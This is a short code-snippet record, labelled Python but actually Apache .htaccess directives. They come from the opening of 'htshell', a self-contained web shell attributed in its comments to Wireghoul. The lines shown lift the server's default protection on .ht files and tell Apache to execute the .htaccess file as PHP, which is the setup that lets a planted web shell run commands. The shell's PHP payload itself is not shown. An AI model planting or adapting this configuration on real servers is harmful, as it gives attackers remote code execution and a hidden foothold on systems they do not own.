---
id: d7ea07cc-9fb7-4b76-b538-72b555b17e24
type: code
language: Python
verified: false
created_at: '2023-04-06T20:43:50.931049+00:00'
updated_at: '2023-04-06T20:44:27.026409+00:00'
---

# Code Snippet d7ea07cc

**Language**: Python

```python
# Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted
# the apache directoves from the .htaccess file
AddType application/x-httpd-php .htaccess
```


